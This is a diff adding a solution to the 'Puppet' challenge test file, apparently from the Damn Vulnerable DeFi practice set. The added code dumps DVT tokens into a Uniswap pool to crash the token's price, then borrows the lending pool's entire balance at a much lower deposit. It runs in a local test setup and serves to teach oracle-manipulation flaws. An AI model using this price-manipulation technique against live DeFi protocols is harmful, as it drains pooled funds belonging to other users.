@@ -11,6 +11,13 @@ function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReser
     )
 }
 
+async function getDVTPrice(uniswapExchange) {
+    return ethers.utils.formatEther(await uniswapExchange.getTokenToEthInputPrice(
+        ethers.utils.parseEther('1'),
+        { gasLimit: 1e6 }
+    ))
+}
+
 describe('[Challenge] Puppet', function () {
     let deployer, attacker;
 
@@ -103,6 +110,36 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Get DVT token price in the Uniswap pool before the dump
+        console.log('DVT token price before dumping:', await getDVTPrice(this.uniswapExchange));
+
+        // Dump a significant amount of DVT tokens into the Uniswap pool
+        const deadline = (await ethers.provider.getBlock("latest")).timestamp + 100; // Set deadline for the swap
+        const swapAmt = ethers.utils.parseEther('900'); // Amount of DVT tokens to swap
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, swapAmt); // Approve Uniswap to spend DVT tokens
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            swapAmt,
+            1, // Minimum amount of ETH to accept (set to 1 for simplicity)
+            deadline
+        );
+
+        // Get DVT token price in the Uniswap pool after the dump
+        console.log('DVT token price after dumping:', await getDVTPrice(this.uniswapExchange));
+
+        // Borrow all the remaining DVT tokens from the lending pool
+        const borrowAmount = await this.token.balanceOf(this.lendingPool.address);
+
+        // Due to our manipulation of liquidity in the Uniswap pool which significantly drops the DVT token price,
+        // the required deposit amount for borrowing DVT tokens will be significantly reduced.
+        const amtDepositRequired = await this.lendingPool.calculateDepositRequired(borrowAmount);
+        await this.lendingPool.connect(attacker).borrow(borrowAmount, { value: amtDepositRequired });
+
+        // Log the DVT token balance of the attacker after the borrow
+        console.log('DVT Token balance of attacker:', ethers.utils.formatEther(await this.token.balanceOf(attacker.address)));
+
+        // Log the ETH balance of the attacker after the borrow
+        console.log('ETH balance of attacker:', ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
+
     });
 
     after(async function () {
